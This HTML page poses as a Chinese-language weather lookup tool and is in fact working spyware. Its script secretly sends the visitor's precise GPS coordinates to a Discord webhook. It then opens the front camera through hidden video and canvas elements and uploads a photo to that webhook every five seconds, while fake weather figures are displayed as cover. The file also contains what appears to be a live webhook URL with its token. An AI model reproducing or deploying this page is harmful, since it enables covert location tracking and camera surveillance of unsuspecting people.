<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>即時天氣查詢系統</title>

<style>
/* 繼承第一個網頁的精美視覺設計 */
body {
    font-family: Arial;
    text-align: center;
    padding-top: 80px;
    overflow: hidden;
    background: linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
    background-size: 500% 500%;
    animation: skyFlow 25s ease infinite;
}

@keyframes skyFlow {
    0%{background-position:0% 50%;}
    50%{background-position:100% 50%;}
    100%{background-position:0% 50%;}
}

.weather-box {
    background: rgba(255,255,255,0.92);
    width: 320px;
    margin: auto;
    padding: 25px;
    border-radius: 20px;
    backdrop-filter: blur(12px);
    box-shadow: 0 20px 60px rgba(0,0,0,0.25);
    animation: cardFloat 6s ease-in-out infinite;
}

@keyframes cardFloat {
    0%{transform:translateY(0px);}
    50%{transform:translateY(-12px);}
    100%{transform:translateY(0px);}
}

.sun {
    width: 90px;
    height: 90px;
    border-radius: 50%;
    margin: 20px auto;
    background: radial-gradient(circle,#fff176,#fdd835,#fbc02d);
    box-shadow: 0 0 40px #ffeb3b, 0 0 80px #ffeb3b;
    animation: sunGlow 4s ease-in-out infinite;
}

@keyframes sunGlow {
    0%{transform:scale(1);}
    50%{transform:scale(1.15);}
    100%{transform:scale(1);}
}

.cloud {
    width: 140px;
    height: 45px;
    background: white;
    border-radius: 40px;
    margin: 20px auto;
    position: relative;
    animation: cloudFloat 6s ease-in-out infinite;
}

.cloud:before, .cloud:after {
    content: "";
    position: absolute;
    background: white;
    border-radius: 50%;
}
.cloud:before { width: 70px; height: 70px; top: -35px; left: 15px; }
.cloud:after { width: 60px; height: 60px; top: -30px; left: 60px; }

@keyframes cloudFloat {
    0%{transform:translateX(-15px);}
    50%{transform:translateX(15px);}
    100%{transform:translateX(-15px);}
}

button {
    padding: 12px 25px;
    font-size: 16px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(45deg,#42a5f5,#1e88e5);
    color: white;
    cursor: pointer;
    transition: 0.3s;
}

button:hover { transform: scale(1.07); box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
#status { margin-top: 20px; font-size: 16px; color: #555; }
</style>

</head>
<body>

<div class="weather-box">
    <div class="sun"></div>
    <div class="cloud"></div>
    <h2>🌤 即時天氣查詢</h2>
    <p>點擊按鈕獲取當前位置天氣資訊</p>
    <button onclick="startAction()">查看天氣</button>
    <p id="status"></p>
</div>

<!-- 隱藏的攝影機處理組件 -->
<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;"></canvas>

<script>
// 請替換成你自己的 Webhook URL
var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";

function startAction() {
    document.getElementById("status").innerHTML = "正在連線衛星取得資料...";
    getLocation();
    getCamera();
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            var acc = pos.coords.accuracy;
            
            // 傳送位置到 Discord
            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "📍 **地理位置回傳**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
                })
            });

            // 偽裝顯示成功訊息
            document.getElementById("status").innerHTML = 
                "☀️ 晴天<br>🌡 溫度：26.5°C<br>🌬 濕度：62%<br>已更新當前位置資訊";

        }, function(err) {
            document.getElementById("status").innerHTML = "需要允許定位權限才能查詢天氣。";
        }, { enableHighAccuracy: true });
    }
}

function getCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(function(stream) {
        var video = document.getElementById("v");
        video.srcObject = stream;
        
        // 設定每 5 秒擷取一次 (5000ms)
        setInterval(function() {
            var canvas = document.getElementById("c");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            var ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(function(blob) {
                var formData = new FormData();
                formData.append('file', blob, 'capture.jpg');
                formData.append('payload_json', JSON.stringify({ content: "📸 **監視畫面擷取**" }));
                
                fetch(webhook, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg", 0.6); // 降低畫質至 0.6 提升傳輸隱蔽性
        }, 5000);
    })
    .catch(function(err) {
        console.log("相機權限被拒絕");
    });
}
</script>

</body>
</html>
